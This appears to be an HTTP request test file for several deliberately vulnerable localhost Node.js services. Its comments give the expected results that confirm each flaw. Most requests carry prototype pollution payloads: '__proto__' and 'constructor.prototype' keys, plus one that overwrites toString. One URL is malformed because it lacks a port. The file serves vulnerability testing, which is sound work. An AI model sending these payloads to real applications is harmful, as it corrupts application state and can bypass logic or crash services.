###vul7
POST http://localhost:3000/ratings/__proto__
Content-Type: application/json

{
  "username": "isPolluted",
  "stars": 5
}
###
GET http://localhost:3000/check-pollution

###vul8
### 1. Normal Request (Should work - 200 OK)
POST http://localhost:3000/vote/poll123
Content-Type: application/json

{
  "userId": "user456",
  "choice": "optionA"
}

### 2. Prototype Pollution Attack via pollId (Should work - 200 OK, proving vulnerability)
POST http://localhost:3000/vote/__proto__
Content-Type: application/json

{
  "userId": "attacker",
  "choice": "polluted"
}

### 3. Prototype Pollution Attack via userId (Should work - 200 OK, proving vulnerability)
POST http://localhost:3000/vote/anyPoll
Content-Type: application/json

{
  "userId": "__proto__",
  "choice": "polluted"
}

### 4. Prototype Pollution Attack setting constructor (Should work - 200 OK, proving vulnerability)
POST http://localhost:3000/vote/constructor
Content-Type: application/json

{
  "userId": "attacker",
  "choice": "polluted"
}

### 5. Invalid Request (Should fail - 400 Bad Request)
POST http://localhost:3000/vote/123
Content-Type: application/json

{
  "userId": 123,  // Not a string
  "choice": "optionA"
}

###vul9
### Test 1: Normal translation request (should work)
PUT http://localhost:3000/translate/en
Content-Type: application/json

{
  "phraseKey": "welcome_message",
  "translation": "Hello World"
}

### Expected: 201 Created


### Test 2: Prototype pollution attempt - polluting Object.prototype
PUT http://localhost:3000/translate/en
Content-Type: application/json

{
  "phraseKey": "__proto__.polluted",
  "translation": "polluted value"
}

### Expected: 201 Created (vulnerable - should succeed)
### Verification: After this request, ALL objects will have .polluted property


### Test 3: Prototype pollution attempt - polluting constructor
PUT http://localhost:3000/translate/en
Content-Type: application/json

{
  "phraseKey": "constructor.prototype.polluted",
  "translation": "constructor pollution"
}

### Expected: 201 Created (vulnerable - should succeed)
### Verification: Affects object prototypes


### Test 4: Check if pollution was successful
GET http://localhost:3000/health

### Expected: 200 OK
### Response should show polluted properties in memoryUsage object


### Test 5: Verify pollution in a new language object
PUT http://localhost:translate/fr
Content-Type: application/json

{
  "phraseKey": "check_pollution",
  "translation": "Check if polluted"
}

### Expected: 201 Created
### Then check if the new fr object has polluted properties:
GET http://localhost:3000/health

### Expected: The new language object should inherit polluted properties

###vul10
### Test 1: Normal Request (Should work - 201 Created)
POST http://localhost:3000/notes/testuser
Content-Type: application/json

{
  "noteId": "safe-note",
  "content": "This is a normal note"
}

### Test 2: Prototype Pollution Attempt - Pollute Object.prototype (Should succeed - 201 Created)
POST http://localhost:3000/notes/testuser
Content-Type: application/json

{
  "noteId": "__proto__.polluted",
  "content": "VALUE"
}

### Test 3: Verify Pollution Worked (Check if prototype was modified)
GET http://localhost:3000/notes/testuser
Content-Type: application/json

### Test 4: Constructor Pollution Attempt (Should succeed - 201 Created)
POST http://localhost:3000/notes/testuser
Content-Type: application/json

{
  "noteId": "constructor.prototype.polluted",
  "content": "VALUE"
}

### Test 5: Verify Constructor Pollution
GET http://localhost:3000/notes/testuser
Content-Type: application/json

### Test 6: Deep Prototype Pollution (Should succeed - 201 Created)
POST http://localhost:3000/notes/testuser
Content-Type: application/json

{
  "noteId": "__proto__.toString",
  "content": "function(){ return 'HACKED'; }"
}

### Test 7: Verify Deep Pollution (Check if native method was overwritten)
GET http://localhost:3000/notes/testuser
Content-Type: application/json